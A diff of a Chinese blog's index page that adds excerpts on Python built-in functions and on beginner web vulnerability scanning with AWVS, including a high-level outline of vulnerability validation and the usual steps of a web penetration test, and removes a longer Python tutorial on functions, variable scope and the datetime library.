+<p>（3）any()函数与all()函数相反，只要组合数据中任何一个是True，则返回True，全部元素都是False才返回False。</p>
+<p>（4）hash()函数对于能够计算哈希的类型返回哈希值。</p>
+<p>（5）id()函数对每一个数据返回唯一编号，数据不同编号不同，可以通过比较两个变量编号是否相同判断数据是否一致。Python将数据存储在内存中的地址作为其唯一编号。</p>
+<p>（6）reversed()函数返回输入组合数据类型的逆序形式。</p>
+<p>（7）sorted()函数对一个序列进行排序，默认从小到大排序。</p>
+<p>（8）type()函数返回每个数据对应的类型。</p>
+<p>实例如下：</p>
+<pre><code class="python">&gt;&gt;&gt; ls = [1,2,5,0]
+&gt;&gt;&gt; all(ls)
+False
+&gt;&gt;&gt; any(ls)
+True
+&gt;&gt;&gt; hash(&quot;中国，你好&quot;)
+8827663102129553702
+&gt;&gt;&gt; id(ls)
+2463935192072
+&gt;&gt;&gt; list(reversed(ls))
+[0, 5, 2, 1]
+&gt;&gt;&gt; sorted(ls)       #不改变ls的值
+[0, 1, 2, 5]
+&gt;&gt;&gt; ls
+[1, 2, 5, 0]
+&gt;&gt;&gt; sorted(ls, reverse=True)
+[5, 2, 1, 0]
+&gt;&gt;&gt; type(ls)
+&lt;class &#39;list&#39;&gt;
+&gt;&gt;&gt; type(reversed(ls))
+&lt;class &#39;list_reverseiterator&#39;&gt;</code></pre>
+<p>（9）Python使用手册<a target="_blank" rel="noopener" href="https://docs.python.org/3">https://docs.python.org/3</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/11/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AD)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A802/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安全初级/WEB漏洞扫描与渗透测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/01/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">WEB漏洞扫描与渗透测试</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/01/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="archive-article-date">
+  	<time datetime="2021-02-01T03:36:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="WEB漏洞扫描器AWVS"><a href="#WEB漏洞扫描器AWVS" class="headerlink" title="WEB漏洞扫描器AWVS"></a>WEB漏洞扫描器AWVS</h2><p>AWVS（Acunetix Web Vulnerability Scanner）自动化的Web漏洞扫描器，审查漏洞如SQL注入，XSS跨站脚本攻击等其他能被黑客利用存在漏洞的网页应用。</p>
+<p>AWVS的使用步骤：</p>
+<p>①　打开浏览器访问：<a href="https://localhost:3443（其中localhost可为存在AWVS工具的主机IP）">https://localhost:3443（其中localhost可为存在AWVS工具的主机IP）</a></p>
+<p>②　在Targets栏，创建一个新的扫描目标</p>
+<p>③　填写目标地址和扫描描述并点击创建目标</p>
+<p>④　若无需登录扫描，则下一步点击scan开始扫描</p>
+<p>⑤　选择扫描类型和报告类型，一般选择Full Scan和Affected Items</p>
+<p>⑥　点击Create Scan开始进行扫描</p>
+<p>⑦　可以在Scans模块查看扫描进度，和漏洞信息</p>
+<p>⑧　在Reports，可以将扫描结果导出成PDF或者HTML格式的报告</p>
+<h2 id="WEB漏洞扫描与验证"><a href="#WEB漏洞扫描与验证" class="headerlink" title="WEB漏洞扫描与验证"></a>WEB漏洞扫描与验证</h2><h3 id="漏洞验证的基本流程："><a href="#漏洞验证的基本流程：" class="headerlink" title="漏洞验证的基本流程："></a>漏洞验证的基本流程：</h3><p>一般步骤是：先提取关键信息–&gt;验证漏洞是否存在–&gt;判断漏洞危害性–&gt;重新记录整理报告</p>
+<p>每个步骤所需要做到的：</p>
+<table>
+<thead>
+<tr>
+<th align="center">提取关键信息</th>
+<th align="center">验证漏洞是否存在</th>
+<th align="center">判断漏洞危害性</th>
+<th align="center">漏洞记录</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">漏洞类型</td>
+<td align="center">存在</td>
+<td align="center">高风险</td>
+<td align="center">基本信息</td>
+</tr>
+<tr>
+<td align="center">漏洞位置</td>
+<td align="center">不存在</td>
+<td align="center">中风险</td>
+<td align="center">验证过程</td>
+</tr>
+<tr>
+<td align="center">漏洞判断依据</td>
+<td align="center"></td>
+<td align="center">低风险</td>
+<td align="center">解决方案</td>
+</tr>
+</tbody></table>
+<h3 id="解读漏洞报告"><a href="#解读漏洞报告" class="headerlink" title="解读漏洞报告"></a>解读漏洞报告</h3><ul>
+<li>漏洞名称：漏洞的名称，通常包括了漏洞的具体类型</li>
+<li>风险等级：描述漏洞的风险等级</li>
+<li>漏洞描述：描述漏洞的基本概念、原理、产生原因等</li>
+<li>漏洞详情：通常包括漏洞的URL、关键参数、漏洞验证payload以及漏洞判断依据等，部分扫描还会提供验证漏洞的请求包和响应包等信息</li>
+<li>漏洞危害：描述漏洞可能会产生什么样的危害</li>
+<li>修复建议：如何修复漏洞的建议</li>
+<li>参考资料：包括补充说明、参考链接等，对于一些组件漏洞通常包含CVE编号或厂家的漏洞说明等</li>
+</ul>
+<h3 id="漏洞记录编写"><a href="#漏洞记录编写" class="headerlink" title="漏洞记录编写"></a>漏洞记录编写</h3><p>主要分为：</p>
+<p>①　漏洞记录表：记录漏洞的类型、风险等级、漏洞描述、漏洞该位置和修复建议信息</p>
+<p>②　漏洞验证过程记录：主要包含验证过程使用的关键payload，详细的漏洞复现步骤，并配有图文描述。</p>
+<h2 id="WEB渗透思路"><a href="#WEB渗透思路" class="headerlink" title="WEB渗透思路"></a>WEB渗透思路</h2><p>WEB应用渗透的目标：通过webshell控制服务器，这个过程通常被称为Getshell</p>
+<p>常见的Getshell过程：</p>
+<p>(1) 漏洞扫描：通过扫描器发现网站存在的漏洞，重点关注SQL注入、命令执行、文件上传等漏洞。</p>
+<p>(2) 后台发现：通过搜索引擎或扫描器发现网站后台登录页面或敏感文件。</p>
+<p>(3) 后台登录：通过SQL注入、暴力破解、敏感文件下载等方式登录网站后台。</p>
+<p>(4) 文件上传：查找文件上传漏洞，上传webshell控制服务器。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全初级</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/01/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-安全初级/OWASP与常见WEB漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1680,1178 +3753,6 @@ Onfocus：当元素获得焦点时触发</code></pre>
 
 
   
-    <article id="post-Python/深入Python语言(五)-函数和代码复用01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/14/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A801/">深入Python语言(五)-函数和代码复用01</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/14/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A801/" class="archive-article-date">
-  	<time datetime="2020-12-14T09:01:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="函数的基本使用"><a href="#函数的基本使用" class="headerlink" title="函数的基本使用"></a>函数的基本使用</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><p>（1）函数是一段具有特定功能的、可重用的语句组，用函数名来表示并通过函数名进行功能调用。函数可以在一个程序中的多个位置使用，也可以用于多个程序。函数可以是自己编写的，称为自定义函数；也可以是Python内置的函数。</p>
-<p>（2）Python使用def保留字定义了一个函数，语法形式如下：</p>
-<pre><code class="Python">def &lt;函数名&gt;(&lt;参数列表&gt;):
-    &lt;函数体&gt;
-    return &lt;返回值列表&gt;
-&#39;&#39;&#39;
-函数名可以是任何有效的Python标识符；
-参数列表是调用该函数时传递给它的值，可以有0个或多个，传递多个参数时用逗号分隔，这里的参数是形式参数，简称&quot;形参&quot;；
-函数体是函数每次被调用时执行的代码；
-当需要返回值时，使用保留字return和返回值列表，否则可以没有return语句
-&#39;&#39;&#39;</code></pre>
-<p>（3）函数调用和执行的一般形式:&lt;函数名&gt;(&lt;参数列表&gt;)。此时，参数列表中给出要传入函数内部的参数，这类参数称为实际参数，简称“实参”。实例：生日歌</p>
-<pre><code class="python">def happy():
-    print(&quot;Happy birthday to you!&quot;)
-def happyB(name):
-    happy()
-    happy()
-    print(&quot;Happy birthday, dear &#123;&#125;!&quot;.format(name))
-    happy()
-happyB(&quot;Mike&quot;)
-print()
-happyB(&quot;Lily&quot;)</code></pre>
-<h3 id="函数的调用过程"><a href="#函数的调用过程" class="headerlink" title="函数的调用过程"></a>函数的调用过程</h3><p>（1）函数调用步骤：调用程序在调用处暂停执行–&gt;在调用时将实参复制给函数的形参–&gt;执行函数体语句–&gt;函数调用结束给出返回值，程序回到调用前的暂停处继续执行。</p>
-<p>（2）由于函数只有在被调用时才执行，因此，上面的实例中，前7行代码不直接执行。程序最先执行的语句是第8行的happyB(“Mike”)。</p>
-<h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><p>（1）lambda保留字用于定义一种特殊的函数——匿名函数，又叫lambda函数。</p>
-<p>（2）匿名函数并非没有名字，而是将表达式作为函数结果返回，语法格式如下：</p>
-<pre><code class="Python">&lt;函数名&gt; = lambda &lt;参数列表&gt;： &lt;表达式&gt;
-等价于：
-def &lt;函数名&gt;(&lt;参数列表&gt;)：
-    return &lt;表达式&gt;</code></pre>
-<p>（3）实例：</p>
-<pre><code class="python">&gt;&gt;&gt; f = lambda x, y : x + y
-&gt;&gt;&gt; type(f)
-&lt;class &#39;function&#39;&gt;
-&gt;&gt;&gt; f(10,12)
-22</code></pre>
-<h2 id="函数的参数传递"><a href="#函数的参数传递" class="headerlink" title="函数的参数传递"></a>函数的参数传递</h2><p><strong>要点：函数可以定义可选参数，使用参数的位置或名称传递参数值，根据函数中变量的不同作用域有不同的函数返回值方式</strong></p>
-<h3 id="可选参数和可变数量参数"><a href="#可选参数和可变数量参数" class="headerlink" title="可选参数和可变数量参数"></a>可选参数和可变数量参数</h3><p>（1）在定义函数时，如果有些参数存在默认值，可以直接为这些参数指定默认值。当函数被调用时，如果没有传入对应的参数值，则使用函数定义时的默认值替代。例如：</p>
-<pre><code class="python">&gt;&gt;&gt; def dup(str, times = 2):
-    print(str*times)
-&gt;&gt;&gt; dup(&quot;knock!&quot;)
-knock!knock!
-&gt;&gt;&gt; dup(&quot;knock!&quot;,4)
-knock!knock!knock!knock!</code></pre>
-<p>（2）由于函数调用时需要按顺序输入参数，可选参数必须定义在非可选参数的后面，即dup()函数中默认值的可选参数times必须定义在str参数后面。</p>
-<p>（3）函数在定义的时，也可以设计可变数量参数，通过在参数前增加星号(*)实现。带有星号的可变参数只能出现在参数列表的最后。调用时，这些参数被当做元组类型传递到函数中。</p>
-<pre><code class="python">&gt;&gt;&gt; def vfunc(a, *b):
-    print(type(b))
-    for n in b:
-        a+=n
-    return a
-&gt;&gt;&gt; vfunc(1,2,3,4,5)
-&lt;class &#39;tuple&#39;&gt;
-15</code></pre>
-<p>（4）上例中vfunc()函数定义了可变参数b，调用vfunc()函数时输入的(2,3,4,5)被当做元祖传递给b，与a累加后输出，这里可以将元祖理解为一组元素。</p>
-<h3 id="参数的位置和名称传递"><a href="#参数的位置和名称传递" class="headerlink" title="参数的位置和名称传递"></a>参数的位置和名称传递</h3><p>（1）函数调用时，实参默认采用按照位置顺序的方式传递给函数，例如dup(“knock!”,4)中第一个实参默认赋值给形参str，第二个实参赋值给形参times。但当参数很多时，这种调用参数的方式可读性较差。例如：</p>
-<pre><code class="python">#假设func()函数有6个参数，它的定义如下，其中参数分别表示两组三维坐标值
-&gt;&gt;&gt;def func(x1,y1,z1,x2,y2,z2):
-    retrun
-#它的一个实际调用如下：
-&gt;&gt;&gt;result = func(1,2,3,4,5,6)</code></pre>
-<p>（2）若仅看实际调用而不看函数定义，很难理解这些输入参数的意义。在大规模的程序中，函数定义可能在函数库中，也可能与调用相距很远，带来的可读性较差。</p>
-<p>（3）为解决上述问题，Python提供了按照形参名称输入实参的方式，此时函数调用如下：</p>
-<pre><code class="python">&gt;&gt;&gt;result = func(x1=1,y1=2,z1=3,x2=4,y2=5,z2=6)
-#也可如下方式调用：
-&gt;&gt;&gt;result = func(x2=4,y2=5,z2=6,x1=1,y1=2,z1=3)</code></pre>
-<p>（4）由于调用函数时指定了参数名称，所以参数之间的顺序可以任意调整。</p>
-<h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><p>（1）return语句用来退出函数并将程序返回到函数被调用的位置继续执行。return语句可以同时将0个、1个或多个函数运算后的结果返回给函数被调用处的变量，</p>
-<pre><code class="Python">&gt;&gt;&gt;def func(a,b):
-    retrun a*b
-&gt;&gt;&gt;s = func(&quot;knock!&quot;,2)
-&gt;&gt;&gt;print(s)
-knock!knock!</code></pre>
-<p>（2）函数可以没有return，此时函数并不返回值，如实例“生日歌”的happy()函数。函数也可以用return返回多个值，多个值以元祖类型保存，例如：</p>
-<pre><code class="python">&gt;&gt;&gt; def func(a,b):
-    return b, a
-&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)
-&gt;&gt;&gt; print(s,type(s))
-(2, &#39;knock!&#39;) &lt;class &#39;tuple&#39;&gt;</code></pre>
-<h3 id="函数对变量的作用"><a href="#函数对变量的作用" class="headerlink" title="函数对变量的作用"></a>函数对变量的作用</h3><p>（1）一个程序中的变量包括两类：全局变量和局部变量。全局变量指在函数之外定义的变量，一般没有缩进，在程序执行全过程有效。局部变量是指在函数内部使用的变量，仅在函数内部有效，当函数退出时变量将不存在。例如：</p>
-<pre><code class="python">&gt;&gt;&gt; n = 1         #n是全局变量
-&gt;&gt;&gt; def func(a, b):
-    c = a * b     #c是局部变量，a和b作为函数参数也是局部变量
-    return c
-&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)
-&gt;&gt;&gt; print(c)
-Traceback (most recent call last):
-  File &quot;&lt;pyshell#14&gt;&quot;, line 1, in &lt;module&gt;
-    print(c)
-NameError: name &#39;c&#39; is not defined   #当函数执行完退出后，其内部变量将被释放
-
-&gt;&gt;&gt; def fun(a, b):
-    n = b         #这个n是在函数内部新生成的局部变量，不是全局变量
-    return a*b
-
-&gt;&gt;&gt; s = fun(&quot;knock!&quot;,2)
-&gt;&gt;&gt; print(s,n)    #测试一下n的值是否改变
-knock!knock! 1</code></pre>
-<p>（2）函数fun()内部使用了变量n，并且将变量参数b赋值给变量n，但n的值并没有改变，因为函数fun()有自己的内存空间，它将n=b语句理解为生成一个局部变量n，并将参数b赋值给它，此时fun()函数没有将n当做全局变量。所以，函数退出后，局部变量n被释放，全局变量n的值没有改变。</p>
-<p>（3）若希望让fun()函数将n当做全局变量，则需要在变量n使用前显式声明该变量为全局变量，代码如下：</p>
-<pre><code class="python">&gt;&gt;&gt; n = 1
-&gt;&gt;&gt; def fun(a, b):
-    global n      #引入全局变量
-    n = b         #将局部变量b赋值给全局变量n
-    return a*b
-&gt;&gt;&gt; s = fun(&quot;knock!&quot;,2)
-&gt;&gt;&gt; print(s,n)    #测试一下n的值是否改变
-knock!knock! 2</code></pre>
-<p>（4）当全局变量不是整数n，而是列表类型ls时，全局列表变量会在函数的调用后发生改变。代码如下：</p>
-<pre><code class="python">&gt;&gt;&gt; ls = []       #ls是全局列表变量
-&gt;&gt;&gt; def func(a,b):
-    ls.append(b)  #将局部变量b增加到全局列表变量ls中
-    return a*b
-
-&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)
-&gt;&gt;&gt; print(s,ls)
-knock!knock! [2]</code></pre>
-<p>（5）列表等组合数据类型由于操作多个数据，所以他们在使用中有创建和引用的分别。当列表变量被方括号([]，无论是否为空)赋值时，这个列表才被真实创建，否则只是对之前创建列表的一次引用。</p>
-<p>（6）上述代码func()函数的ls.append(b)语句执行时需要一个真实创建过的列表，此时func()函数专属的内存空间中没有已经创建过且名称为ls的列表，因此，func()函数进一步去寻找全局内存空间，自动关联全局ls列表，并修改其内容。当func()函数退出后，全局ls列表中的内容被修改。也就是说，<strong>对于列表类型，函数可以直接使用全局列表而不需要采用global进行声明。</strong></p>
-<p>（7）若func()函数内部存在一个真实创建过且名称为ls的列表，则func()函数将操作该列表而不会修改全局变量。例如：</p>
-<pre><code class="python">&gt;&gt;&gt; ls = []        #ls是全局列表变量
-&gt;&gt;&gt; def func(a,b):
-    ls = []        #创建了名称为ls的局部列表变量列
-    ls.append(b)   #将局部变量b增加到局部列表变量ls中
-    return a*b
-
-&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)
-&gt;&gt;&gt; print(s,ls)    #测试ls的值是否被改变
-knock!knock! []</code></pre>
-<p><strong>总结，Python函数对变量的作用遵守如下原则。</strong></p>
-<ul>
-<li>简单数据类型变量无论是否与全局变量重名，仅在函数内部创建和使用，函数退出后变量被释放，如有全局同名变量，其值不变。</li>
-<li>简单数据类型变量在用global保留字声明后，作为全局变量使用，函数退出后该变量保留且值被函数改变。</li>
-<li>对于组合数据类型的全局变量，如果在函数内部没有被真实创建的同名变量，则函数内部可以直接使用并修改全局变量的值。</li>
-<li>如果函数内部真实创建了组合数据类型变量，无论是否有同名全局变量，函数仅对局部变量进行操作，函数退出后局部变量被释放，全局变量值不变。</li>
-</ul>
-<p><strong>扩展：指针和引用</strong></p>
-<p>（1）指针是保存地址的变量，一般出现在比较底层的程序设计语言中，如C语言。引用是某一变量的别名，用这个名字可以对变量进行操作，如Python列表类型的引用。</p>
-<p>（2）二者的主要区别是，指针直接指向内存地址，说明对象已经生成，而引用只是别名，需要真实创建对象才能操作对象。</p>
-<h2 id="datetime库的使用"><a href="#datetime库的使用" class="headerlink" title="datetime库的使用"></a>datetime库的使用</h2><p>要点：<strong>Python时间处理的标准函数库datetime提供了一批显示日期和时间的格式化方法。</strong></p>
-<h3 id="datetime库概述"><a href="#datetime库概述" class="headerlink" title="datetime库概述"></a>datetime库概述</h3><p>（1）datetime库可以从系统中获得时间，并以用户选择的格式输出。datetime库以格林威治时间为基础，每天由3600*24秒精确定义。该库包括两个常量：datetime.MINYEAR和datetime.MAXYEAR，分别表示datetime所能表示的最小、最大年份，值分别为1与9999.</p>
-<p>（2）datetime库以类的方式提供多种日期和时间表达方式。</p>
-<ul>
-<li>datetime.date：日期表示类，可以表示年、月、日等。</li>
-<li>datetime.time：时间表示类，可以表示小时、分钟、秒、毫秒等。</li>
-<li>datetime.datetime：日期和时间表示的类，功能覆盖date和time类。</li>
-<li>datetime.timedelta：与时间间隔有关的类。</li>
-<li>datetime.tzinfo：与时区有关的信息表示类。</li>
-</ul>
-<p>（3）以上表达方式中，datetime.datetime类表达形式最为丰富。使用datetime类需要用import保留字，引用datetime类的方式如下：</p>
-<pre><code class="python">from datetime import datetime</code></pre>
-<h3 id="datetime库解析"><a href="#datetime库解析" class="headerlink" title="datetime库解析"></a>datetime库解析</h3><p>（1）datetime类(datetime.datetime类)的使用方式是首先创建一个datetime对象，然后通过对象的方法和属性显示时间。创建datetime对象有三种方法：datetime.now()、datetime.utcnow()和datetime.datetime()。</p>
-<ul>
-<li><p>使用datetime.now()获得当前日期和时间对象，使用方法如下：</p>
-<p><strong>datetime.now()</strong></p>
-<p>作用：返回一个datetime类型，表示当前的日期和时间，精确到微秒。</p>
-<p>参数：无</p>
-<p>调用该函数，执行结果如下：</p>
-<pre><code class="python">&gt;&gt;&gt;from datetime import datetime
-&gt;&gt;&gt;today = datetime.now()
-&gt;&gt;&gt;today
-datetime.datetime(2021, 2, 10, 17, 34, 27, 70232)</code></pre>
-</li>
-<li><p>使用datetime.utcnow()获得当前日期和时间对应的UTC(世界标准时间)时间对象，使用方法如下：</p>
-<p><strong>datetime.utcnow()</strong></p>
-<p>作用：返回一个datetime类型，表示当前日期和时间的UTC表示，精确到微秒。</p>
-<p>参数：无</p>
-<p>调用该函数，执行结果如下：</p>
-<pre><code class="python">&gt;&gt;&gt; today = datetime.utcnow()
-&gt;&gt;&gt; today
-datetime.datetime(2021, 2, 10, 9, 36, 43, 119372)</code></pre>
-</li>
-<li><p>datetime.now()和datetime.utcnow()都返回一个datetime类型的对象，也可以直接使用datetime()构造一个日期和时间对象，使用方法如下：</p>
-<p><strong>datetime(year, month, day, hour=0, minute=0, second=0, microsecond=0)</strong></p>
-<p>作用：返回一个datetime类型，表示指定的日期和时间，可以精确到微秒。</p>
-<p>参数如下：</p>
-<p>year：指定的年份，MINYEAR &lt;= year &lt;= MAXYEAR</p>
-<p>month：指定的月份，1 &lt;= month &lt;= 12</p>
-<p>day：指定的日期，1 &lt;= day &lt;= 月份所对应的日期上限</p>
-<p>hour：指定的小时，0 &lt;= hour &lt; 24</p>
-<p>minute：指定的分钟数，0 &lt;= minute &lt; 60</p>
-<p>second：指定的秒数，0 &lt;= second &lt; 60</p>
-<p>microsecond：指定的微秒数，0 &lt;= microsecond &lt; 1000000</p>
-<p>其中，hour、minute、second、microsecond参数可以全部或部分省略</p>
-<p>调用datetime()函数直接创建一个datetime对象，表示2021年2月10日17:47,32秒7微秒，执行结果如下：</p>
-<pre><code class="python">&gt;&gt;&gt; someday = datetime(2021,2,10,17,47,32,7)
-&gt;&gt;&gt; someday
-datetime.datetime(2021, 2, 10, 17, 47, 32, 7)</code></pre>
-<p>（2）当程序有了一个datetime对象，就可以进一步利用这个对象的属性显示时间，为了区别datetime库名，采用上例中的someday代替生成的datetime对象。常见属性如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th align="center">属性</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">someday.min</td>
-<td align="center">固定返回datetime的最小时间对象，datetime(1,1,1,0,0)</td>
-</tr>
-<tr>
-<td align="center">someday.max</td>
-<td align="center">固定返回datetime的最大时间对象，datetime(9999,12,31,23,59,59,999999)</td>
-</tr>
-<tr>
-<td align="center">someday.year</td>
-<td align="center">返回someday包含的年份</td>
-</tr>
-<tr>
-<td align="center">someday.month</td>
-<td align="center">返回someday包含的月份</td>
-</tr>
-<tr>
-<td align="center">someday.day</td>
-<td align="center">返回someday包含的日期</td>
-</tr>
-<tr>
-<td align="center">someday.hour</td>
-<td align="center">返回someday包含的小时</td>
-</tr>
-<tr>
-<td align="center">someday.minute</td>
-<td align="center">返回someday包含的分钟</td>
-</tr>
-<tr>
-<td align="center">someday.second</td>
-<td align="center">返回someday包含的秒钟</td>
-</tr>
-<tr>
-<td align="center">someday.microsecond</td>
-<td align="center">返回someday包含的微妙值</td>
-</tr>
-</tbody></table>
-<p>（3）datetime对象有3个常用的时间格式化方法，如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th align="center">属性</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">someday.isoformat()</td>
-<td align="center">采用ISO 8601标准显示时间</td>
-</tr>
-<tr>
-<td align="center">someday.isoweekday()</td>
-<td align="center">根据日期计算星期后返回1到7，对应星期一到星期日</td>
-</tr>
-<tr>
-<td align="center">someday.strftime()</td>
-<td align="center">根据格式化字符串format进行格式显示的方法</td>
-</tr>
-</tbody></table>
-<ul>
-<li>isoformat() 和isoweekday() 方法的使用如下：</li>
-</ul>
-<pre><code class="python">&gt;&gt;&gt; someday = datetime(2021,2,10,17,47,32,7)
-&gt;&gt;&gt; someday.isoformat()
-&#39;2021-02-10T17:47:32.000007&#39;
-&gt;&gt;&gt; someday.isoweekday()
-3</code></pre>
-</li>
-<li><p>strftime()方法是时间格式化最有效的方法，几乎可以以任何通用格式输出时间。例如：</p>
-<pre><code class="python">&gt;&gt;&gt; someday.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)
-&#39;2021-02-10 17:47:32&#39;</code></pre>
-</li>
-<li><p>下表给出了strftime()方法的格式化控制符。</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">格式化字符串</th>
-<th align="center">日期/时间</th>
-<th align="center">值范围和实例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">%Y</td>
-<td align="center">年份</td>
-<td align="center">0001~9999，例如：1900</td>
-</tr>
-<tr>
-<td align="center">%m</td>
-<td align="center">月份</td>
-<td align="center">01~12，例如：10</td>
-</tr>
-<tr>
-<td align="center">%B</td>
-<td align="center">月名</td>
-<td align="center">January~December，例如：April</td>
-</tr>
-<tr>
-<td align="center">%b</td>
-<td align="center">月名缩写</td>
-<td align="center">Jan~Dec，例如：Apr</td>
-</tr>
-<tr>
-<td align="center">%d</td>
-<td align="center">日期</td>
-<td align="center">01~31，例如：25</td>
-</tr>
-<tr>
-<td align="center">%A</td>
-<td align="center">星期</td>
-<td align="center">Monday~Sunday，例如：Wednesday</td>
-</tr>
-<tr>
-<td align="center">%a</td>
-<td align="center">星期缩写</td>
-<td align="center">Mon~Sun，例如：Wed</td>
-</tr>
-<tr>
-<td align="center">%H</td>
-<td align="center">小时(24h制)</td>
-<td align="center">00~23，例如：12</td>
-</tr>
-<tr>
-<td align="center">%I</td>
-<td align="center">小时(12h制)</td>
-<td align="center">12<del>12/1</del>12，例如：06</td>
-</tr>
-<tr>
-<td align="center">%M</td>
-<td align="center">分钟</td>
-<td align="center">00~59，例如：26</td>
-</tr>
-<tr>
-<td align="center">%S</td>
-<td align="center">秒钟</td>
-<td align="center">00~59，例如：26</td>
-</tr>
-<tr>
-<td align="center">%x</td>
-<td align="center">日期</td>
-<td align="center">月/日/年，例如：02/10/2021</td>
-</tr>
-<tr>
-<td align="center">%X</td>
-<td align="center">时间</td>
-<td align="center">时:分:秒，例如：18:22:08</td>
-</tr>
-<tr>
-<td align="center">%p</td>
-<td align="center">上午和下午两个时段</td>
-<td align="center">AM/PM</td>
-</tr>
-</tbody></table>
-<ul>
-<li><p>strftime()格式化字符串的数字左侧会自动补零，上述格式也可以与print()的格式化函数一起使用，例如：</p>
-<pre><code class="python">&gt;&gt;&gt; from datetime import datetime
-&gt;&gt;&gt; now =datetime.now()
-&gt;&gt;&gt; now.strftime(&quot;%Y-%m-%d&quot;)
-&#39;2021-02-10&#39;
-&gt;&gt;&gt; now.strftime(&quot;%A, %d. %B %Y %I:%M%p&quot;)
-&#39;Wednesday, 10. February 2021 06:24PM&#39;
-&gt;&gt;&gt; print(&quot;今天是&#123;0:%Y&#125;年&#123;0:%m&#125;月&#123;0:%d&#125;日&quot;.format(now))
-今天是2021年02月10日</code></pre>
-</li>
-</ul>
-<h2 id="实例：七段数码管绘制"><a href="#实例：七段数码管绘制" class="headerlink" title="实例：七段数码管绘制"></a>实例：七段数码管绘制</h2><p><strong>用于理解函数及其封装的价值</strong></p>
